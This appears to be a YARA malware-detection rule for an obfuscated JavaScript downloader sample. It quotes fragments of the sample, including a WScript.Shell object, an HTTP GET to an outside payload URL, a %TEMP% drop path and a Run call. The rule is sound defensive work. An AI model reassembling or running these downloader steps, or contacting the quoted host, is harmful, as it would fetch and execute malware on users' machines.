rule sig_20160427_bbe120b60fe19ee857380cc8c2f18c02 {
  meta:
    description = "datamaliciousorder - file 20160427_bbe120b60fe19ee857380cc8c2f18c02.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "de877b0a09916565fae2be120ada86e2c02fe30f4761a19dbfe5a2a7f99cb90e"

  strings:
    $s1  = "GmbyfDxdvz[TdxqxZnndm](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "function JdtoiUjmxd() {return NhchfQgcih[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"fqtDcJp" ascii
    $s3  = "function JdtoiUjmxd() {return NhchfQgcih[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"fqtDcJp" ascii
    $s4  = "var NhchfQgcih = function OjjguJbiuy() {return NulazFfssy[JgowjRughe](\"WScript\"+\".Shell\");}(), OnovyHdhse = 11;" fullword ascii
    $s5  = "function PsvtnRwjzc(UryosIrtsj, QrkkyGhfrf){BtueaQtdwf = BtueaQtdwf * 1; return UryosIrtsj - QrkkyGhfrf;};" fullword ascii
    $s6  = "var NulazFfssy = this[\"WScript\"];" fullword ascii
    $s7  = "function KhwbfOtneb(){return HkdwrGbcva + \"\";};" fullword ascii
    $s8  = "if (GmbyfDxdvz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function NrwbdYlpny() {return ((RzeuwZbcqm == true) && (RzeuwZbcqm == JfodrSrpqs)) ? 1 : BtueaQtdwf;};" fullword ascii
    $s10 = "var RzeuwZbcqm = false;" fullword ascii
    $s11 = "var JfodrSrpqs = false;" fullword ascii
    $s12 = "function XovstHtoak(PjvjiBczjq) {var ZyervIrbep = (1, 2, 3, 4, 5, PjvjiBczjq); return ZyervIrbep;};" fullword ascii
    $s13 = "function LzdmpZimhi(MfvmkPeshf){NhchfQgcih[\"R\"+\"un\"](MfvmkPeshf, BtueaQtdwf, BtueaQtdwf);};" fullword ascii
    $s14 = "function WirjfIxlab(){return 23;};" fullword ascii
    $s15 = "ZclxzLpguw = true;" fullword ascii
    $s16 = "var AaofxPxrxe = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function XexkzCkuln(){return JgowjRughe;};" fullword ascii
    $s18 = "var ZclxzLpguw = false;" fullword ascii
    $s19 = "}while (BarmqWhzol);" fullword ascii
    $s20 = "RzeuwZbcqm = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}